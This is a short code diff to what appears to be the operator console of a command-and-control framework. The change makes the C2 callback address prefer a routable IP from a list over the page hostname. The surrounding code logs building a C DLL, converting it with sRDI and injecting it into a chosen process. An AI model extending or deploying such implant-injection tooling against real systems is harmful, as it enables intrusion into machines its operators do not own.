@@ -12540,7 +12540,8 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
       try {
         const jobs = await api('GET', '/api/jobs');
         const httpsJob = (jobs?.data || []).find(j => j.protocol === 'HTTPS' && j.status === 'running');
-        if (httpsJob) serverURL = `https://${window.location.hostname}:${httpsJob.port}`;
+        const c2host = c2IPs.find(ip => ip && !ip.startsWith('127.') && !ip.startsWith('169.254.')) || c2IPs[0] || window.location.hostname;
+        if (httpsJob) serverURL = `https://${c2host}:${httpsJob.port}`;
       } catch(_) {}
       if (!serverURL) { addConsoleOutput('', 'no running HTTPS listener — start one first', null); return; }
       addConsoleOutput(`[*] building C DLL → sRDI → inject PID ${pid} (${method}) via ${serverURL}…`, '', null);
